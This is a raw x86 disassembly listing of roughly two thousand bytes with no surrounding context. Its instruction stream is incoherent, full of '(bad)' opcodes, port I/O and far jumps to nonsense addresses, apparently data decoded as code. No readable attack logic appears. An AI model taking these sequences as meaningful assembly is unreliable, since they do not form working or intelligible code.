  423026:	ret    0xf460
  423029:	mov    ah,0xaf
  42302b:	mov    ?,ebx
  42302d:	js     0x422fcf
  42302f:	sub    al,0xc0
  423031:	lock stos DWORD PTR es:[edi],eax
  423033:	pop    esp
  423034:	xor    eax,0xb50b43bd
  423039:	pop    ds
  42303a:	stos   DWORD PTR es:[edi],eax
  42303b:	repz (bad) 
  42303d:	call   0x3f6a:0x42937bfa
  423044:	out    dx,eax
  423045:	cdq    
  423046:	popa   
  423047:	aas    
  423048:	mov    esi,0x1b7fa01e
  42304d:	or     ch,BYTE PTR [ecx+0x763b595d]
  423053:	sbb    eax,DWORD PTR [esi]
  423055:	xchg   ebp,eax
  423056:	das    
  423057:	leave  
  423058:	sub    cl,ah
  42305a:	mov    ch,0xbb
  42305c:	retf   0x1a62
  42305f:	lods   al,BYTE PTR ds:[esi]
  423060:	pushf  
  423061:	in     al,dx
  423062:	(bad)  
  423064:	sti    
  423065:	sar    BYTE PTR ds:0xc3b38d87,0xee
  42306c:	gs pop esp
  42306e:	adc    eax,0x57e9d056
  423073:	xor    al,0x4c
  423075:	sbb    bl,BYTE PTR [edi]
  423077:	or     edi,DWORD PTR [eax-0x5b60fa96]
  42307d:	mov    bl,BYTE PTR [edx-0xdcd0b95]
  423083:	push   cs
  423084:	xchg   ebx,eax
  423085:	jb     0x4230ae
  423087:	or     BYTE PTR [eax],dh
  423089:	xchg   edx,eax
  42308a:	adc    DWORD PTR [edi-0x2dc5c7bf],esi
  423090:	mov    edx,esp
  423092:	adc    edi,DWORD PTR [ecx+0x3731caac]
  423098:	dec    esp
  423099:	fisubr DWORD PTR ds:0xdec8651b
  42309f:	jns    0x423043
  4230a1:	inc    eax
  4230a2:	xor    eax,0xfbf952cb
  4230a7:	cld    
  4230a8:	xor    cl,al
  4230aa:	(bad)  
  4230ab:	imul   edx,DWORD PTR [ebx+0x14f232e5],0xffffffac
  4230b2:	aaa    
  4230b3:	mov    al,0x79
  4230b5:	retf   0x2df3
  4230b8:	push   ebp
  4230b9:	das    
  4230ba:	dec    ebp
  4230bb:	xchg   ecx,eax
  4230bc:	sahf   
  4230bd:	ins    BYTE PTR es:[edi],dx
  4230be:	neg    BYTE PTR [edx+0x59]
  4230c1:	test   BYTE PTR [esi+0x3bc46fde],dh
  4230c7:	cli    
  4230c8:	or     eax,0x5fd7eb57
  4230cd:	out    dx,eax
  4230ce:	cli    
  4230cf:	jmp    0x1a2f:0x53d5751d
  4230d6:	popf   
  4230d7:	mov    ch,0x90
  4230d9:	add    DWORD PTR [ebx+0x337b965b],ebp
  4230df:	call   0x760d5ecc
  4230e4:	mov    eax,0x180b4c74
  4230e9:	imul   esi,ecx,0xc7cf192c
  4230ef:	push   0xbe447dd5
  4230f4:	and    ch,BYTE PTR [edi+0x24]
  4230f7:	imul   edx,edi,0x25
  4230fa:	xchg   ebp,eax
  4230fb:	inc    ebp
  4230fc:	pop    ebx
  4230fd:	mov    dh,0xb9
  4230ff:	or     WORD PTR [edi-0x4c67fd7c],0x22
  423107:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423108:	retf   0x4901
  42310b:	push   ebx
  42310c:	inc    esp
  42310d:	push   eax
  42310e:	mov    ds:0x7d7887d2,al
  423113:	jno    0x42316f
  423115:	gs mov al,0x49
  423118:	shr    esp,cl
  42311a:	jl     0x42314b
  42311c:	push   eax
  42311d:	(bad)  
  42311e:	in     eax,dx
  42311f:	jae    0x42315e
  423121:	imul   edi,edi,0x15
  423124:	hlt    
  423125:	data16 add BYTE PTR [esi],dl
  423128:	mov    al,0x9a
  42312a:	fs push edx
  42312c:	xlat   BYTE PTR ds:[ebx]
  42312d:	xlat   BYTE PTR ds:[ebx]
  42312e:	lds    ebp,FWORD PTR [edx]
  423130:	mov    al,ds:0xf5c26deb
  423135:	(bad)  
  423136:	xchg   edi,eax
  423137:	pop    edx
  423138:	dec    eax
  423139:	fdivr  QWORD PTR [esi+0x7d]
  42313c:	add    bh,BYTE PTR [eax]
  42313e:	cmp    cl,dl
  423140:	int3   
  423141:	sub    ebx,DWORD PTR [ebx]
  423143:	xchg   bh,ah
  423145:	pop    esi
  423146:	cli    
  423147:	lock (bad) 
  423149:	dec    edi
  42314a:	mov    ebx,0x24001a86
  42314f:	iret   
  423150:	jecxz  0x423135
  423152:	dec    ecx
  423153:	sbb    DWORD PTR [edi+0x20da80ec],edx
  423159:	mov    ah,0x26
  42315b:	jmp    0x9480cd22
  423160:	fcom   DWORD PTR [eax+0x65]
  423163:	sub    dl,al
  423165:	imul   ecx
  423167:	out    0x8d,al
  423169:	adc    bl,ah
  42316b:	das    
  42316c:	mov    al,ds:0x5af2ff6f
  423171:	add    eax,0x426e4c17
  423176:	lods   eax,DWORD PTR ds:[esi]
  423177:	push   ecx
  423178:	mov    al,ds:0x8ec596eb
  42317d:	shl    BYTE PTR [edx],cl
  42317f:	dec    edx
  423180:	fst    DWORD PTR [ecx-0x3b]
  423183:	sub    edx,DWORD PTR cs:[edx]
  423186:	mov    edx,0x61a2ae59
  42318b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42318c:	leave  
  42318d:	cmp    ah,bh
  42318f:	icebp  
  423190:	in     al,0xa2
  423192:	test   DWORD PTR [edi],edi
  423194:	mov    ecx,ds
  423196:	dec    eax
  423197:	shl    edx,cl
  423199:	pop    esi
  42319a:	push   ss
  42319b:	(bad)  
  42319c:	popa   
  42319d:	stos   BYTE PTR es:[edi],al
  42319e:	push   ebx
  42319f:	inc    ecx
  4231a0:	imul   eax,ebp,0x55
  4231a3:	in     eax,0x5a
  4231a5:	rcl    ecx,0xf1
  4231a8:	pmaxub mm7,QWORD PTR [edx-0x456f4918]
  4231af:	aas    
  4231b0:	lea    edx,[edi]
  4231b2:	pop    ss
  4231b3:	fld    DWORD PTR [ecx-0x79]
  4231b6:	fwait
  4231b7:	mov    ebp,0xe46d5381
  4231bc:	mov    dl,0x7d
  4231be:	xor    bl,bl
  4231c0:	es fwait
  4231c2:	mov    ebx,0x9536bd58
  4231c7:	inc    eax
  4231c8:	lods   al,BYTE PTR ds:[esi]
  4231c9:	pop    ebp
  4231ca:	mov    cl,0x30
  4231cc:	mov    esi,0xcf87ae2f
  4231d1:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4231d2:	push   edx
  4231d3:	nop
  4231d4:	xchg   ebp,eax
  4231d5:	and    al,0x59
  4231d7:	sub    edi,ebx
  4231d9:	(bad)  
  4231da:	hlt    
  4231db:	stc    
  4231dc:	aad    0x26
  4231de:	xor    eax,0x3297132
  4231e3:	test   BYTE PTR [ecx],dl
  4231e5:	jno    0x423238
  4231e7:	or     edx,ebp
  4231e9:	mov    dl,0xf
  4231eb:	ret    0x960b
  4231ee:	retf   
  4231ef:	clc    
  4231f0:	cld    
  4231f1:	js     0x423201
  4231f3:	inc    ecx
  4231f4:	or     DWORD PTR [esi],ebx
  4231f6:	mov    dl,0x7b
  4231f8:	dec    ebx
  4231f9:	xchg   ebx,eax
  4231fa:	and    DWORD PTR [ecx+eax*1+0x12],0x44
  4231ff:	fs into 
  423201:	lods   eax,DWORD PTR ds:[esi]
  423202:	loopne 0x4231e1
  423204:	lods   eax,DWORD PTR ds:[esi]
  423205:	push   es
  423206:	push   ss
  423207:	ins    DWORD PTR es:[edi],dx
  423208:	sti    
  423209:	cwde   
  42320a:	mov    bh,BYTE PTR [edx-0xd]
  42320d:	jo     0x423211
  42320f:	mov    ebx,0xac5920cd
  423214:	adc    DWORD PTR [esi],0x3aabc299
  42321a:	ins    DWORD PTR es:[edi],dx
  42321b:	add    al,0xc9
  42321d:	jl     0x42321e
  42321f:	fucomi st,st(6)
  423221:	xchg   ebp,eax
  423222:	jns    0x4231e2
  423224:	(bad)  
  423226:	call   0x1bc:0x5e37809
  42322d:	inc    edx
  42322e:	jp     0x42325a
  423230:	fistp  WORD PTR [ebx]
  423232:	xor    DWORD PTR [eax+0x2cc652fb],ebp
  423238:	pop    ebp
  423239:	ins    DWORD PTR es:[edi],dx
  42323a:	lds    edi,FWORD PTR [edi+ebx*2-0x67c00596]
  423241:	fcom   DWORD PTR [ebx-0x51]
  423244:	std    
  423245:	ds cdq 
  423247:	push   esi
  423248:	js     0x4232b0
  42324a:	sub    BYTE PTR [ebx-0x2cdef625],al
  423250:	adc    dh,BYTE PTR [ebx+0x4d]
  423253:	call   FWORD PTR [ebp-0x7e]
  423256:	data16 fs in al,0x56
  42325a:	adc    al,0x61
  42325c:	mov    WORD PTR [esi-0xe],?
  42325f:	(bad)  
  423260:	lds    edx,FWORD PTR [esi]
  423262:	push   edx
  423263:	sub    al,0xbc
  423265:	cld    
  423266:	mov    esi,0x9590b2d9
  42326b:	aad    0x6e
  42326d:	mov    dh,0x4c
  42326f:	stc    
  423270:	cmp    eax,edi
  423272:	jge    0x423216
  423274:	neg    DWORD PTR [ecx+0x7cf8ab2]
  42327a:	gs jmp 0x6a0ee8b
  423280:	jno    0x423278
  423282:	mov    bl,0xd1
  423284:	add    ecx,DWORD PTR [ebp+0x38de51d5]
  42328a:	add    eax,0xaa62347d
  42328f:	cmc    
  423290:	aad    0x72
  423292:	in     al,dx
  423293:	(bad)  
  423295:	icebp  
  423296:	pop    ds
  423297:	data16 add al,BYTE PTR [edi+0x4a6f2fe8]
  42329e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42329f:	aad    0x86
  4232a1:	pop    ds
  4232a2:	retf   
  4232a3:	je     0x4232e0
  4232a5:	cld    
  4232a6:	add    al,0xa1
  4232a8:	jbe    0x42325d
  4232aa:	mov    eax,ds:0xd4e9a076
  4232af:	fwait
  4232b0:	js     0x4232ff
  4232b2:	mov    bl,0xc
  4232b4:	mov    ebx,0xd10254d5
  4232b9:	(bad)  
  4232ba:	jmp    0x6fc:0xf3a7f8da
  4232c1:	jp     0x4232f7
  4232c3:	jne    0x42326b
  4232c5:	pop    edi
  4232c6:	iret   
  4232c7:	push   0xbe9dd95f
  4232cc:	nop
  4232cd:	mov    ah,0xb1
  4232cf:	cmp    al,BYTE PTR [edx+0x36ea33ae]
  4232d5:	jno    0x4232c6
  4232d7:	sub    eax,0xeffedd9e
  4232dc:	jne    0x4232e1
  4232de:	imul   eax,DWORD PTR [eax],0xffffffd0
  4232e1:	shr    cl,0xdd
  4232e4:	neg    ah
  4232e6:	mov    ebx,0x2fb279e5
  4232eb:	adc    dh,BYTE PTR fs:[esi-0x4]
  4232ef:	iret   
  4232f0:	jecxz  0x42330b
  4232f2:	mov    ch,0x94
  4232f4:	pop    ecx
  4232f5:	repnz add al,0x48
  4232f8:	xchg   bl,bl
  4232fa:	or     al,0xfd
  4232fc:	aam    0x3d
  4232fe:	stc    
  4232ff:	sub    dl,dl
  423301:	hlt    
  423302:	inc    ecx
  423303:	mov    ebp,ebp
  423305:	fsubrp st(6),st
  423307:	pop    ss
  423308:	xchg   edx,eax
  423309:	xlat   BYTE PTR ds:[ebx]
  42330a:	(bad)  
  42330b:	pop    ss
  42330c:	retf   
  42330d:	rcl    BYTE PTR ds:0xd33db2df,0x4b
  423314:	jbe    0x42337f
  423316:	cmp    eax,edi
  423318:	push   ecx
  423319:	mov    esp,0x7a673b81
  42331e:	std    
  42331f:	repnz and esp,esi
  423322:	mov    BYTE PTR [eax],0x74
  423325:	and    cl,BYTE PTR [ecx+0x3a1ebf4a]
  42332b:	add    eax,0xef7406ba
  423330:	mov    eax,es:0x745d4f01
  423336:	(bad)  
  423337:	jmp    0x423386
  423339:	pop    esp
  42333a:	xor    eax,0xea06348d
  42333f:	stos   BYTE PTR es:[edi],al
  423340:	aas    
  423341:	inc    ebx
  423342:	push   DWORD PTR [ebp+0x69d49fae]
  423348:	test   al,0x2f
  42334a:	daa    
  42334b:	imul   DWORD PTR [ebx+eiz*1-0x3a]
  42334f:	or     ebx,DWORD PTR [edi-0x3719f037]
  423355:	add    BYTE PTR [edi+esi*4-0x64],ah
  423359:	mov    al,0x2b
  42335b:	jae    0x423344
  42335d:	push   es
  42335e:	mov    esi,0xb6c9aeb
  423363:	pop    ss
  423364:	dec    edi
  423365:	mov    dh,0x3a
  423367:	sbb    BYTE PTR [edi],dh
  423369:	cmp    BYTE PTR [eax-0xf],0xf0
  42336d:	cmp    BYTE PTR [edx-0x33],cl
  423370:	sbb    bh,BYTE PTR [ebp-0x3]
  423373:	and    al,0x6a
  423375:	lods   eax,DWORD PTR ds:[esi]
  423376:	cmp    al,0xdc
  423378:	pusha  
  423379:	push   ss
  42337a:	addr16 mov ah,0x1b
  42337d:	hlt    
  42337e:	jecxz  0x423363
  423380:	or     BYTE PTR [ebx-0x7136fad3],dl
  423386:	or     al,0xd9
  423388:	shr    DWORD PTR [edi],cl
  42338a:	cmp    BYTE PTR [edx-0x74f98ca0],al
  423390:	aam    0xee
  423392:	imul   esi
  423394:	or     al,ah
  423396:	jno    0x42340c
  423398:	jmp    0x423396
  42339a:	in     al,dx
  42339b:	fadd   DWORD PTR [ebx]
  42339d:	dec    esi
  42339e:	adc    esi,ebp
  4233a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4233a1:	pop    esi
  4233a2:	jge    0x4233b2
  4233a4:	loopne 0x42338e
  4233a6:	pop    esp
  4233a7:	mov    dh,bl
  4233a9:	cmp    DWORD PTR [ebx-0x11],esi
  4233ac:	into   
  4233ad:	cmp    esi,DWORD PTR [esi-0x2a7f2059]
  4233b3:	dec    ebp
  4233b4:	(bad)  
  4233b5:	hlt    
  4233b6:	jbe    0x4233a9
  4233b8:	pop    ss
  4233b9:	mov    dl,0x42
  4233bb:	jne    0x42339b
  4233bd:	in     al,0x90
  4233bf:	iret   
  4233c0:	push   eax
  4233c1:	imul   ecx,esp,0x5979e66e
  4233c7:	test   BYTE PTR [esi-0x1a6a9ba1],dh
  4233cd:	pop    ss
  4233ce:	aaa    
  4233cf:	ror    BYTE PTR [edi+eax*1],1
  4233d2:	push   ebp
  4233d3:	sub    dh,BYTE PTR [ecx]
  4233d5:	lahf   
  4233d6:	hlt    
  4233d7:	adc    DWORD PTR [ebp+0x1712c15b],ecx
  4233dd:	rol    BYTE PTR [ebp-0x6746013b],0x72
  4233e4:	imul   edx,DWORD PTR [ecx-0x42],0x2f
  4233e8:	dec    ebp
  4233e9:	(bad)  
  4233ea:	adc    eax,0x37249023
  4233ef:	xchg   edx,eax
  4233f0:	test   edx,esp
  4233f2:	or     cl,bl
  4233f4:	lock mov ?,WORD PTR [edx+eax*1+0x7f]
  4233f9:	mov    ebx,0x658488b4
  4233fe:	stos   DWORD PTR es:[edi],eax
  4233ff:	jno    0x42342c
  423401:	stos   DWORD PTR es:[edi],eax
  423402:	paddusb mm3,QWORD PTR [esi-0x3]
  423406:	sti    
  423407:	xlat   BYTE PTR ds:[ebx]
  423408:	loope  0x42342b
  42340a:	xor    al,0x49
  42340c:	(bad)  
  42340d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42340e:	test   al,0x17
  423410:	ds mov edx,0x8496f521
  423416:	xlat   BYTE PTR cs:[ebx]
  423418:	jo     0x423474
  42341a:	lods   eax,DWORD PTR ds:[esi]
  42341b:	lea    ebx,[edi-0x22a25d0f]
  423421:	pop    esi
  423422:	jg     0x42340f
  423424:	jno    0x423445
  423426:	cmp    eax,0x867abf5
  42342b:	mov    esp,0xa9ea0dfb
  423430:	inc    ecx
  423431:	mov    edi,0x101afea7
  423436:	out    dx,al
  423437:	add    DWORD PTR [eax],eax
  423439:	std    
  42343a:	adc    DWORD PTR [esi],0x27d8bd00
  423440:	shr    edi,1
  423442:	pop    esp
  423443:	sbb    eax,0x3f13a3ec
  423448:	pushf  
  423449:	(bad)  
  42344a:	retf   0x707f
  42344d:	push   0xa2e85958
  423452:	add    al,0x5b
  423454:	cmp    BYTE PTR ds:0x944f8f95,bl
  42345a:	pop    eax
  42345b:	out    0x5e,al
  42345d:	xchg   edi,eax
  42345e:	push   esp
  42345f:	sub    ch,BYTE PTR ds:0xb85a3907
  423465:	or     DWORD PTR [esi+0x7b],ebx
  423468:	adc    eax,0x214fa85
  42346d:	xor    BYTE PTR [esp+ebx*8],0x69
  423471:	mov    ah,0xf8
  423473:	mov    ch,0x7e
  423475:	cmp    ch,BYTE PTR [edi-0x9c94729]
  42347b:	mov    ecx,0xf097ec3e
  423480:	dec    esi
  423481:	fldenv [ecx]
  423483:	inc    edi
  423484:	ss loop 0x4234eb
  423487:	inc    ecx
  423488:	stos   BYTE PTR es:[edi],al
  423489:	jne    0x4234e6
  42348b:	stc    
  42348c:	(bad)  [edx-0x38]
  42348f:	or     bh,ch
  423491:	cmp    BYTE PTR [ecx+0x60],al
  423494:	test   dh,bh
  423496:	xchg   esp,eax
  423497:	call   0xaecd:0xff07e061
  42349e:	mov    edx,0x8953952d
  4234a3:	inc    ecx
  4234a4:	adc    eax,DWORD PTR [esi+ebx*4]
  4234a7:	jae    0x423491
  4234a9:	dec    DWORD PTR [ebx]
  4234ab:	retf   
  4234ac:	mov    eax,0xf230e668
  4234b1:	hlt    
  4234b2:	cdq    
  4234b3:	mov    ah,0x22
  4234b5:	dec    ebx
  4234b6:	add    ebp,ecx
  4234b8:	adc    al,0x4b
  4234ba:	mov    ch,0xbe
  4234bc:	mov    al,0x2e
  4234be:	scas   eax,DWORD PTR es:[edi]
  4234bf:	or     DWORD PTR [edx+edi*8+0x2de8e0ec],0xf7ed349b
  4234ca:	es data16 je 0x4234c8
  4234ce:	lahf   
  4234cf:	jmp    0xa20d078a
  4234d4:	lods   eax,DWORD PTR ds:[esi]
  4234d5:	mov    edi,0xcd2816
  4234da:	mov    ah,0x1b
  4234dc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4234dd:	addr16 push ecx
  4234df:	je     0x4234ed
  4234e1:	test   DWORD PTR [edx],ebx
  4234e3:	cmp    DWORD PTR [edi-0x65],esp
  4234e6:	pop    esp
  4234e7:	inc    edi
  4234e8:	call   0x17dc:0xa23c7778
  4234ef:	sbb    eax,0xb0b925e9
  4234f4:	out    dx,al
  4234f5:	and    al,0x80
  4234f7:	call   0x2353:0x1a78bf52
  4234fe:	sbb    esi,DWORD PTR [ecx]
  423500:	mov    edi,0x31b74652
  423505:	or     edi,DWORD PTR [edi-0x181c6b54]
  42350b:	inc    DWORD PTR [ebx+0x17]
  42350e:	loopne 0x423496
  423510:	std    
  423511:	mov    ebp,0xc2ae270d
  423516:	jmp    0xf728:0xd3d721a
  42351d:	imul   edi,DWORD PTR [ecx+0x14],0x34cffd1e
  423524:	push   0xfcb55899
  423529:	inc    BYTE PTR [ecx]
  42352b:	add    DWORD PTR [esp+ebx*8],ebx
  42352e:	mov    ds:0x45d7e9ca,al
  423533:	(bad)  
  423534:	fdivrp st(5),st
  423536:	aam    0x33
  423538:	fiadd  DWORD PTR [edi]
  42353a:	aaa    
  42353b:	mov    ebp,0x12369bc5
  423540:	cmp    edi,eax
  423542:	and    BYTE PTR [edi],0x27
  423545:	gs jno 0x42355d
  423548:	retf   
  423549:	fs sti 
  42354b:	push   esp
  42354c:	add    al,0x5c
  42354e:	cdq    
  42354f:	mov    dl,0xb1
  423551:	mov    ebx,0x6eeee06b
  423556:	pop    ss
  423557:	out    dx,eax
  423558:	out    0x35,eax
  42355a:	pop    ds
  42355b:	adc    esp,DWORD PTR [ecx+0x67]
  42355e:	std    
  42355f:	ss addr16 leave 
  423562:	in     al,dx
  423563:	or     ah,ah
  423565:	mov    DWORD PTR [eax+0x13],esp
  423568:	cdq    
  423569:	cs in  eax,dx
  42356b:	sub    DWORD PTR [ecx+0x15a591ff],ebp
  423571:	dec    esp
  423572:	ins    BYTE PTR es:[edi],dx
  423573:	fmul   QWORD PTR [eax+0x2d017d68]
  423579:	rol    dh,cl
  42357b:	xor    al,0xfb
  42357d:	pop    edi
  42357e:	adc    dh,BYTE PTR [ecx+0x1a]
  423581:	xor    dl,BYTE PTR [esi+0x44]
  423584:	lds    edi,FWORD PTR [eax-0x1a]
  423587:	cmp    DWORD PTR [edi-0x1f],esp
  42358a:	lds    edi,FWORD PTR [edi]
  42358c:	mov    edi,0xcda57601
  423591:	sti    
  423592:	fld    TBYTE PTR [eax+0x51897a36]
  423598:	add    eax,0x4d7275d8
  42359d:	out    dx,eax
  42359e:	ds jl  0x4235af
  4235a1:	(bad)  
  4235a2:	mov    cs,WORD PTR [ebx+0x74ad19d0]
  4235a8:	inc    eax
  4235a9:	xchg   ebx,eax
  4235aa:	into   
  4235ab:	popa   
  4235ac:	sub    DWORD PTR [ecx+0x5082e6e3],ebp
  4235b2:	jmp    0x423600
  4235b4:	retf   0xc654
  4235b7:	das    
  4235b8:	inc    esp
  4235b9:	jl     0x4235f3
  4235bb:	dec    eax
  4235bc:	or     ch,BYTE PTR [edi]
  4235be:	dec    edx
  4235bf:	sbb    esp,DWORD PTR [edx+0x13b23bac]
  4235c5:	adc    al,BYTE PTR [ecx-0x2a22e488]
  4235cb:	sub    cl,al
  4235cd:	mov    ecx,0xd3d3db2e
  4235d2:	js     0x42361d
  4235d4:	push   es
  4235d5:	in     al,0x4f
  4235d7:	push   edx
  4235d8:	mov    dh,0xbf
  4235da:	xchg   edx,eax
  4235db:	lea    ebp,[ebx-0x486d211b]
  4235e1:	push   eax
  4235e2:	push   es
  4235e3:	jmp    DWORD PTR [esp+ebx*2+0x27]
  4235e7:	fucomip st,st(0)
  4235e9:	loop   0x423580
  4235eb:	ds sbb ecx,edi
  4235ee:	pop    esp
  4235ef:	sub    ah,BYTE PTR [ebx]
  4235f1:	inc    ecx
  4235f2:	and    ebp,DWORD PTR [eax]
  4235f4:	ins    BYTE PTR es:[edi],dx
  4235f5:	push   esi
  4235f6:	verw   dx
  4235f9:	fimul  DWORD PTR ds:[eax-0x1f]
  4235fd:	clc    
  4235fe:	bound  edi,QWORD PTR [edx+0xc]
  423601:	ja     0x4235b4
  423603:	int    0x64
  423605:	in     al,0x41
  423607:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  423608:	sbb    esp,DWORD PTR [edx+0x21bf7ac]
  42360e:	pop    ebp
  42360f:	pushf  
  423610:	push   eax
  423611:	test   al,0xc1
  423613:	dec    edi
  423614:	push   esi
  423615:	jge    0x4235b0
  423617:	imul   ebp,DWORD PTR [eax-0x4e2c7a0],0xffffffb1
  42361e:	loopne 0x4235c9
  423620:	mov    bl,0x76
  423622:	pop    ecx
  423623:	mov    ebp,0xacb4066b
  423628:	jp     0x423683
  42362a:	cmp    edx,0x5dedec1b
  423630:	jo     0x423646
  423632:	mov    ebp,0x12f9a6f3
  423637:	adc    ebp,0x8ee9f7fb
  42363d:	xchg   ebp,eax
  42363e:	push   eax
  42363f:	iret   
  423640:	dec    edi
  423641:	(bad)  
  423642:	loop   0x42360c
  423644:	push   ebx
  423645:	adc    ah,BYTE PTR ds:0xe2d6566c
  42364b:	daa    
  42364c:	call   0xb1873ddc
  423651:	fisttp DWORD PTR [esi]
  423653:	loop   0x423611
  423655:	mov    DWORD PTR [ecx+eax*8-0x6b],esp
  423659:	adc    eax,0x6c13ec5f
  42365e:	mov    es,WORD PTR [esi+0x6cbdcc54]
  423664:	adc    cl,dh
  423666:	clc    
  423667:	push   di
  423669:	xor    DWORD PTR [esi],eax
  42366b:	mov    cl,0xc6
  42366d:	loop   0x423662
  42366f:	stos   DWORD PTR es:[edi],eax
  423670:	push   ecx
  423671:	push   0x36
  423673:	call   0x6fd70102
  423678:	test   al,0x11
  42367a:	fcomi  st,st(7)
  42367c:	cli    
  42367d:	mov    edx,0x42ee632a
  423682:	fst    QWORD PTR [ecx+0x1b]
  423685:	mov    al,fs:0x7813a65f
  42368b:	mov    edi,0x2383e492
  423690:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  423691:	fisub  DWORD PTR [esi+0x4]
  423694:	fstp   st(4)
  423696:	push   es
  423697:	add    al,0x29
  423699:	sbb    BYTE PTR [edi],al
  42369b:	push   edi
  42369c:	push   ss
  42369d:	nop
  42369e:	ins    BYTE PTR es:[edi],dx
  42369f:	mov    bh,0xd1
  4236a1:	outs   dx,BYTE PTR ds:[esi]
  4236a2:	mov    bh,0x54
  4236a4:	cmp    ah,ch
  4236a6:	mov    dh,0xbe
  4236a8:	jb     0x423693
  4236aa:	and    al,0x99
  4236ac:	cmp    ah,bl
  4236ae:	stos   BYTE PTR es:[edi],al
  4236af:	ja     0x4236b8
  4236b1:	push   ss
  4236b2:	das    
  4236b3:	cmc    
  4236b4:	cmc    
  4236b5:	outs   dx,BYTE PTR ds:[esi]
  4236b6:	lds    esp,FWORD PTR [ecx+edi*2+0x4]
  4236ba:	inc    esi
  4236bb:	das    
  4236bc:	das    
  4236bd:	cmc    
  4236be:	out    dx,al
  4236bf:	fsub   st,st(2)
  4236c1:	std    
  4236c2:	popf   
  4236c3:	aaa    
  4236c4:	mov    ch,0xb8
  4236c6:	outs   dx,BYTE PTR ds:[esi]
  4236c7:	loopne 0x423649
  4236c9:	pop    es
  4236ca:	inc    eax
  4236cb:	mov    ebp,0x63bd5289
  4236d0:	add    ch,BYTE PTR [ecx]
  4236d2:	sbb    al,0x1d
  4236d4:	dec    eax
  4236d5:	and    eax,0xfa08db6d
  4236da:	lock cmc 
  4236dc:	xchg   ecx,eax
  4236dd:	mov    ah,0xda
  4236df:	test   al,0xd2
  4236e1:	jmp    0xcaeb810d
  4236e6:	push   ss
  4236e7:	fs or  eax,0x21f194fa
  4236ed:	cmp    BYTE PTR [ebp+0x2],bl
  4236f0:	ins    BYTE PTR es:[edi],dx
  4236f1:	sub    al,0x81
  4236f3:	push   esi
  4236f4:	jns    0x423744
  4236f6:	mov    cl,0x2a
  4236f8:	fld    DWORD PTR [edi]
  4236fa:	loope  0x4236a9
  4236fc:	mov    ah,0xa0
  4236fe:	retf   
  4236ff:	stc    
  423700:	ficom  WORD PTR [edx+0x6b6ad969]
  423706:	mov    dh,0x5f
  423708:	dec    edi
  423709:	mov    ebp,0x326684e1
  42370e:	inc    ecx
  42370f:	sbb    al,0x3d
  423711:	xor    eax,0xcd0815e4
  423716:	test   BYTE PTR [eax-0x127f265d],0xf9
  42371d:	jmp    0x423724
  42371f:	or     ebp,DWORD PTR [edi-0x63]
  423722:	jne    0x4237a1
  423724:	xor    eax,0x347165b0
  423729:	add    edi,DWORD PTR [eax]
  42372b:	lea    ecx,[ebp+0x37a24e70]
  423731:	jne    0x423769
  423733:	arpl   WORD PTR [ecx],dx
  423735:	add    BYTE PTR [eax-0x30],bl
  423738:	and    eax,0x14cde236
  42373d:	loopne 0x42371e
  42373f:	out    dx,al
  423740:	jmp    esi
  423742:	(bad)  
  423743:	fstp   DWORD PTR [eax]
  423745:	xchg   esi,eax
  423746:	or     al,0x13
  423748:	sbb    edx,edx
  42374a:	jecxz  0x4237b2
  42374c:	xor    BYTE PTR [esi+0x44653ad3],cl
  423752:	or     DWORD PTR [esi],ecx
  423754:	xchg   DWORD PTR [esi+0x5c58a237],eax
  42375a:	inc    ecx
  42375b:	cmp    eax,0x32a30e33
  423760:	lea    edi,[edx]
  423762:	jge    0x423744
  423764:	jl     0x423739
  423766:	ret    0x46e3
  423769:	mov    ds:0xcbc32158,eax
  42376e:	xchg   ecx,eax
  42376f:	dec    edx
  423770:	aas    
  423771:	out    0x94,eax
  423773:	in     eax,dx
  423774:	clc    
  423775:	sub    edx,0x1
  423778:	xor    al,0x6f
  42377a:	retf   0xc5a3
  42377d:	jbe    0x42373a
  42377f:	mov    DWORD PTR [ebp-0x20fd33cc],ebx
  423785:	cmp    al,0xa0
  423787:	adc    dl,bl
  423789:	popf   
  42378a:	jmp    0x42376e
  42378c:	push   0xa818db1f
  423791:	and    DWORD PTR [esi-0x46],0x3a
  423795:	fwait
  423796:	aad    0x8b
  423798:	cli    
  423799:	bnd jb 0x4237af
  42379c:	adc    eax,0xeffb9257
  4237a1:	mov    ds:0xfb037a9b,al
  4237a6:	jmp    0xa10c4c42
  4237ab:	sub    ecx,eax
  4237ad:	dec    esp
  4237ae:	add    DWORD PTR [ebp+0x688ce03e],esi
  4237b4:	adc    BYTE PTR [edi+0x23],cl
  4237b7:	(bad)  
  4237b8:	mov    edi,0xa57dbe8a
  4237bd:	faddp  st(6),st
  4237bf:	add    al,0xeb
  4237c1:	not    DWORD PTR [edx+edi*8-0x8]
  4237c5:	call   FWORD PTR [ecx+ecx*2-0x32fcd3de]
  4237cc:	xchg   edx,eax
  4237cd:	push   ecx
  4237ce:	mov    BYTE PTR [edx-0x6433b4de],bh
  4237d4:	lods   al,BYTE PTR ds:[esi]
  4237d5:	fstp   TBYTE PTR [edi]
  4237d7:	sub    eax,0x79c85495
  4237dc:	xchg   ebp,eax
  4237dd:	repnz mov edi,0x54109fa9
  4237e3:	packsswb mm3,QWORD PTR [esi-0x3b00f83e]
  4237ea:	xchg   edi,eax
  4237eb:	les    esi,FWORD PTR [ebp+0x41dc2191]
  4237f1:	gs dec edi
  4237f3:	repz jns 0x423857
  4237f6:	rcl    DWORD PTR [ecx+0x51],cl
  4237f9:	mov    DWORD PTR [edi+0x509cc0a6],ebp
  4237ff:	scas   eax,DWORD PTR es:[edi]
  423800:	arpl   WORD PTR [edx+ebp*2+0x2b88f8a9],si
  423807:	(bad)  
  423809:	cmp    eax,0x2bb56049
  42380e:	mov    al,ds:0xe60f0a33
  423813:	push   cs
  423814:	shr    ah,1
  423816:	iret   
  423817:	retf   
  423818:	imul   dh
  42381a:	add    eax,0xbd53ba00
  42381f:	mov    ds:0x1f44debb,eax
  423824:	cmp    cl,dl
  423826:	retf   
  423827:	or     al,0x6
  423829:	lock sub edx,edi
  42382c:	outs   dx,BYTE PTR ds:[esi]
  42382d:	push   ebx
  42382e:	hlt    
